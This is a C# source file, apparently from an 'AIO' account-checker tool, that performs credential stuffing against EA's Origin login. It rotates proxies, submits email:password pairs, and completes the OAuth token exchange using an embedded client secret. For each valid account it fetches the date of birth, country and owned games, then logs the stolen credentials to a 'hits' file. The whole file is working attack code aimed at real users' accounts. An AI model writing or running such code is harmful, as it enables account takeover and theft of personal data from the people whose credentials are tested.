using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace Origin
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = true;
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                       new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        HttpResponse httpResponse = httpRequest.Get("https://signin.ea.com/p/originX/login?execution=e1633018870s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fclient_id%3DORIGIN_PC%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26display%3DoriginX%252Flogin%26locale%3Den_US%26nonce%3D1256%26pc_machine_id%3D15173374696391813834", null);
                        httpRequest.AllowAutoRedirect = true;
                        string address = httpResponse["SelfLocation"];
                        string str = string.Concat(new string[]
                       {
                               "email=",
                                  s[0],
                                 "&password=",
                                 s[1],
                            "&_eventId=submit&cid=6beCmB9ucTISOiFl2iTqx0IDZTklkePP&showAgeUp=true&googleCaptchaResponse=&_rememberMe=on&_loginInvisible=on"
                         });
                        string text2 = httpRequest.Post(address, str, "application/x-www-form-urlencoded").ToString();
                        if (text2.Contains("Your credentials are incorrect"))
                        {
                            // Bad
                            break;
                        }
                        else
                        {
                            if (text2.Contains("latestSuccessLogin"))
                            {
                                string str2 = Check.Parse(text2, "fid=", "\";");
                                string source = httpRequest.Get("https://accounts.ea.com/connect/auth?client_id=ORIGIN_PC&response_type=code+id_token&redirect_uri=qrc%3A%2F%2F%2Fhtml%2Flogin_successful.html&display=originX%2Flogin&locale=en_US&nonce=1256&pc_machine_id=15173374696391813834&fid=" + str2, null)["Location"];
                                string str3 = Check.Parse(source, "code=", "&id");
                                string text3 = httpRequest.Post("https://accounts.ea.com/connect/token", "grant_type=authorization_code&code=" + str3 + "&client_id=ORIGIN_PC&client_secret=UIY8dwqhi786T78ya8Kna78akjcp0s&redirect_uri=qrc:///html/login_successful.html", "application/x-www-form-urlencoded").ToString();
                                if (text3.Contains("access_token\""))
                                {
                                    string text4 = Check.Parse(text3, "access_token\" : \"", "\",");
                                    httpRequest.AddHeader("Authorization", "Bearer " + text4);
                                    string text5 = httpRequest.Get("https://gateway.ea.com/proxy/identity/pids/me", null).ToString();
                                    if (text5.Contains("country\""))
                                    {
                                        string text6 = Check.Parse(text5, "dob\" : \"", "\",");
                                        string text7 = Check.Parse(text5, "country\" : \"", "\",");
                                        string str4 = Check.Parse(text5, "pidId\" : ", ",");
                                        httpRequest.AddHeader("Accept", "application/vnd.origin.v2+json");
                                        httpRequest.AddHeader("AuthToken", text4);
                                        httpRequest.AddHeader("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)");
                                        string text8 = httpRequest.Get("https://api1.origin.com/ecommerce2/basegames/" + str4 + "?machine_hash=17524622993368447356", null).ToString();
                                        List<string> list = new List<string>();
                                        if (text8.Contains("offerPath\" : \"/"))
                                        {
                                            foreach (string text9 in text8.Substrings("offerPath\" : \"/", "\",", 0, StringComparison.Ordinal, 0, null))
                                            {
                                                list.Add(text9.ToString());
                                            }
                                            string text10 = string.Join(" |game| ", list);
                                                if (Config.config.LogorCui == "2")
                                                {
                                                    Console.WriteLine("[Hit - Origin] " + s[0] + ":" + s[1] + " | Country: " + text7 + " | Dob: " + text6 + " | Games: " + text10, Color.Green);
                                                }
                                                ZeusAIO.mainmenu.hits++;
                                                Export.AsResult("/Origin_hits", s[0] + ":" + s[1] + " | Country: " + text7 + " | Dob: " + text6 + " | Games: " + text10);
                                                return false;

                                            }
                                    }
                                    else
                                        {
                                            ZeusAIO.mainmenu.errors++;
                                            goto Retry;
                                        }
                                }
                                break;
                            }
                        }
                    }
                    //break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

